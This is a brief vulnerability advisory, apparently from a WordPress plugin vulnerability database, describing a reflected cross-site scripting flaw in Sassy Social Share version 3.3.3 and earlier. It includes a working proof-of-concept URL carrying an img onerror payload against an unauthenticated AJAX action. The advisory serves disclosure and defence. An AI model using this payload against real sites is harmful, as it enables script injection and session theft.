## WordPress Plugin Vulnerabilities

# Sassy Social Share <= 3.3.3 - Cross-Site Scripting (XSS)

### Description

AJAX endpoints which returns JSON data has no Content-Type header set, and uses default text/html. Any JSON that has HTML will be rendered as such.

### Proof of Concept

PoC URL (uses unauthenticated action "heateor\_sss\_sharing\_count"):
http://WORDPRESS\_DOMAIN\_HERE/wp-admin/admin-ajax.php?action=heateor\_sss\_sharing\_count&urls[<img%20src%3dx%20onerror%3dalert(document.domain)>]=
Other authenticated AJAX actions may also lead to reflected XSS, but not tested.

### Affects Plugins
